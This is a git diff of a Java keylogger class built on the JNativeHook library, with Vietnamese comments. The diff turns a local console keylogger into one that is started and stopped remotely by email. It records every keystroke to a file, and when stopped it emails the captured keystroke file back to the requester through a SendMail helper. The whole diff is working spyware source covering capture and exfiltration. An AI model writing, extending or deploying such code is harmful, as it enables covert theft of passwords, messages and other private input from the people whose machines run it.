@@ -4,94 +4,99 @@ import com.github.kwhat.jnativehook.GlobalScreen;
 import com.github.kwhat.jnativehook.NativeHookException;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
+import socket.SendMail;
 
-import java.awt.event.KeyEvent;
-import java.io.BufferedWriter;
-import java.io.FileWriter;
-import java.io.IOException;
+import java.io.*;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
+import java.nio.file.StandardOpenOption;
 import java.time.LocalDateTime;
 import java.time.format.DateTimeFormatter;
 import java.util.ArrayList;
+import java.util.Properties;
 import java.util.Scanner;
 
 public class KeyLogger implements NativeKeyListener {
-    private static KeyLogger keyLogger;
-    private ArrayList<String> logs = new ArrayList<>();
-    private String logFilePath = "./output/keylog_output.txt"; // Đường dẫn tới tệp ghi log
+    private static final Path file = Paths.get("./src/main/java/output/keys.txt");
+    private static boolean running = false;
 
-    private void addLog(String log) {
-        logs.add(log);
-    }
-
-    private void saveLogsToFile() {
-        try (BufferedWriter writer = new BufferedWriter(new FileWriter(logFilePath))) {
-            for (String log : logs) {
-                writer.write(log);
-            }
-        } catch (IOException e) {
-            e.printStackTrace();
+    static {
+        try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE,
+                StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING)) {
+            // Mở và ghi đè file khi lớp được load
+        } catch (IOException ex) {
+            System.out.println("The file can't be opened or truncated");
+            System.exit(-1);
         }
     }
 
-    public static void startKeyLogger() {
-        try {
-            if (keyLogger == null) {
-                keyLogger = new KeyLogger();
-                GlobalScreen.registerNativeHook();
-                GlobalScreen.addNativeKeyListener(keyLogger);
-                System.out.println("Keylogger started.");
-            } else {
-                System.out.println("Keylogger is already running.");
-            }
-        } catch (NativeHookException e) {
-            e.printStackTrace();
-        }
-    }
-
-    public static void stopKeyLogger() {
-        try {
-            if (keyLogger != null) {
-                GlobalScreen.unregisterNativeHook();
-                keyLogger = null;
-                System.out.println("Keylogger stopped.");
-            } else {
-                System.out.println("Keylogger is not running.");
-            }
-        } catch (NativeHookException e) {
-            e.printStackTrace();
-        }
-    }
+//    public static void main(String[] args) {
+//        startKeylogger();
+//    }
 
     public void nativeKeyPressed(NativeKeyEvent e) {
-        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode()) + " ";
-        addLog(keyText);
-        System.out.println("Key Pressed: " + keyText);
+        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
+
+//        if (keyText.equals("Undefined") || keyText.equals("Unknown")) {
+//            keyText = "Key code: " + e.getKeyCode();
+//        }
+
+        try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.APPEND);
+             PrintWriter writer = new PrintWriter(os)) {
+            if (keyText.length() > 1) {
+                writer.print("[" + keyText + "]");
+            } else {
+                writer.print(keyText);
+            }
+        } catch (IOException ex) {
+            System.out.println("sai o duoi");
+            System.exit(-1);
+        }
     }
 
     public void nativeKeyReleased(NativeKeyEvent e) {
-        // Xử lý sự kiện khi phím được nhả ra
     }
 
     public void nativeKeyTyped(NativeKeyEvent e) {
-        // Xử lý sự kiện khi phím được gõ
     }
 
-    public static void main(String[] args) {
-        // Bắt đầu keylogger
-        KeyLogger.startKeyLogger();
+    public static void startKeylogger(String from) {
+        if (!running) {
+            try {
+                GlobalScreen.registerNativeHook();
+            } catch (NativeHookException e) {
+                System.out.println("Error in activated hook.");
+                System.exit(-1);
+            }
+            GlobalScreen.addNativeKeyListener(new KeyLogger());
+            running = true;
+            System.out.println("Keylogger has started...");
+        } else {
+            System.out.println("Keylogger is running...");
+        }
+        SendMail.sendEmail(from, "Reply for request: Start keylogger", "",
+                HTMLGenerator.generateHTML("Your request has been completed successfully!", "Key logger has started"));
+    }
 
-        // Chờ cho đến khi người dùng nhấn Enter để dừng keylogger
-        System.out.println("Press Enter to stop the keylogger.");
-        Scanner scanner = new Scanner(System.in);
-        scanner.nextLine(); // Đợi người dùng nhấn Enter
+    public static void stopKeylogger(String from) {
+        if (running) {
+            try {
+                GlobalScreen.unregisterNativeHook();
+                running = false;
+                System.out.println("Keylogger has been stopped.");
+            } catch (NativeHookException e) {
+                System.out.println("Error when activation hook.");
+            }
+        } else {
+            System.out.println("Keylogger hasn't started yet.");
+        }
 
-        KeyLogger.stopKeyLogger();
-        scanner.close();
+        SendMail.sendEmail(from, "Reply for request: Start keylogger", file.toString(),
+                HTMLGenerator.generateHTML("Your request has been completed successfully",
+                        """
+                                 The keylogger has stopped. 
+                                 The file below contains the captured keystrokes.
+                                """));
     }
 }
-
-
-
-
-
-
